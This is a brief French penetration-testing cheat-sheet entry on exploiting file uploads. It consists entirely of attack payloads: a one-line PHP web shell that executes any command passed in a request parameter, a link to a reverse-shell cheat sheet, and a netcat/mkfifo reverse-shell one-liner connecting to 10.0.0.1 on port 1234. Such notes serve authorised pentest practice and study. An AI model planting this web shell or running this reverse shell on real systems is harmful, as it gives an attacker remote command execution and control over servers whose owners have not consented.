## Upload de fichier

Exécution de commande basique :

```php
<?php
    system($_REQUEST['cmd']);
?>
```

Reverse shell:
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```



